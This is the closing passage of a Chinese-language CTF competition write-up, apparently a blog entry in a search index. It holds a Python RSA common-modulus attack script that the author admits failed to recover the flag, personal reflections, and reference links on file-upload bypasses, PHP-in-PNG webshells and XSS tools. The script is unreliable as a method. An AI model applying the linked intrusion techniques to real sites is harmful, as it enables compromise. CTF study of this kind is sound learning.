class="number">7927632180925780686814468716254548866073876571301670927803568567992929927231666309788681512003760545920706822481579873353923145930555620003462589361971404649174770107086295817994744475096856399932862153021335565923236506465046739212222528807145844779588311833022632475905272022533594289777471811000950934146066045472218603345107418836739010466236517799411565681939684720963118217633594133046157469386003057018852372681387318985149400851657988757739939640107583630568340335757129814894759082226790230350623403635880468479392207604875482436028050237168056669104984504520909514306552404757744266671282270481535254632231</span></span><br><span class="line">c2 = <span class="number">19162894772364755634695403163786451410245098251726628084799257554767334519905640179161346412307514221332891648206034353728374020165930677162860102377777681292582203157662333178388904577242217496599789741706061676944395451665239726479077741007297709368920091594846785681021427819585722029936761040901809601396670202192052497066209075288103228744858127970671076282164969113619499174358765991380757911727424305398346399701274033326030443722686643479760852934150701783998463047750118216160431187984416861424972003041835112849345069144579908117061092179552843173803432427193984945136248106420527309951492325647621839772126</span></span><br><span class="line"><span class="comment"># c3 = 12281989205300534636704612304895466894728582803084654071108548003638296732533233324118128443432186580642178421360358569501856887776677567285142630332770995470034693283004693504328569378601328550606731466373274474890323776647142155504550689141803732334439130044963732806927780975317712578470165550637007845813598338398021681428237912733055103663278507239375781432804708170722603762602715296180599171769475818480578806749013564273888734572033232825425951511959908980277564593244704622649568752985829748683356507419796438898916535864730103144986484287500764463579887673117770889298009984153867524175061353407719439002075</span></span><br><span class="line"></span><br><span class="line">g = gcd(e1, e2)</span><br><span class="line">e1_ = e1 // g</span><br><span class="line">e2_ = e2 // g</span><br><span class="line">l, s1, s2 = gcdext(e1_, e2_)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">m = iroot(m, g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;long_to_bytes(m).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>只不過最後的答案是錯誤的，沒能找到正確的 flag。可能是因為本題的 gcd 太大，還要找其他的算法。</p><h1 id="參賽心得"><a href="#參賽心得" class="headerlink" title="參賽心得"></a>參賽心得</h1><p>這次算是我第一次花了那麼多的時間打 CTF 比賽，之前可能就是自己在網路上解解題甚麼的，總的來說還是很有趣的一次體驗。而參加完這次的比賽，我也更加地意識到自己的不足，真的還有很多可以進步、練習的地方。即便可能有點被打擊信心，但我也不會氣餒，我要更努力的練習，沒事就多解解題甚麼的，增強自己的實力，希望可以在之後的比賽表現得越來越好！</p><h1 id="參考資料區"><a href="#參考資料區" class="headerlink" title="參考資料區"></a>參考資料區</h1><ul><li><a href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%85%B6%E4%BB%96%E8%A7%84%E5%88%99">文件上傳漏洞總結</a></li><li><a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE !</a></li><li><a href="https://ithelp.ithome.com.tw/articles/10245459?sc=hot">[Day 26] 026 - 串流加密法 - Stream cipher</a></li><li><a href="https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1">童舒晧資安資源整理(XSS 教學)</a></li><li><a href="https://xz.aliyun.com/t/3952?time__1311=n4+xnD0DBDgGG=G8+eDsA3xCqm/z3K3r34D&alichlgref=https://www.google.com/">安全工具——XSSer</a></li><li><a href="https://blog.csdn.net/mydriverc2/article/details/42048983?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-42048983-blog-113249158.235%5Ev43%5Epc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.2&utm_relevant_index=2">XSSer 使用(CSDN)</a></li><li><a href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701">关于 RSA 共模攻击 e1，e2 不互素的解法</a></li><li><a href="https://blog.csdn.net/qq_40345591/article/details/127476867">文件上传漏洞进阶教程&#x2F;白名单绕过&#x2F;图片马制作&#x2F;图片马执行</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> SCIST </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
